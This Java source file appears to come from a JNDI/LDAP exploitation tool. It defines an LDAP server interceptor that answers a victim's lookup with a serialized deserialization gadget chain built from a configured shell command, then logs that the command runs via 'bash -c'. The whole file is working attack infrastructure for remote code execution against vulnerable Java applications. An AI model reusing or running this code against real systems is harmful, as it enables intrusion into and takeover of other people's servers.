package server.ldap.interceptor;

import cli.Config;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import gadget.ObjectPayload;
import gadget.context.GContext;
import util.CommonUtil;

/**
 * return serialization data directly
 */
public class RSOperationInterceptor implements LDAPInterceptor {
    private String gadget;

    public RSOperationInterceptor(String gadget) {
        this.gadget = gadget;
    }

    @Override
    public void sendResult(Entry entry, InMemoryInterceptedSearchResult result) throws Exception {
        GContext context = new GContext();
        ObjectPayload op = context.getGadget(this.gadget);
        String command = Config.command;
        entry.addAttribute("javaClassName", "foo");

        byte[] data = CommonUtil.serialize(op.getObjectPayload(command));
        entry.addAttribute("javaSerializedData", data);
        System.out.printf("[LDAP] send serial data directly >> use %s execute command [bash -c '%s']\n", this.gadget, command);

        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
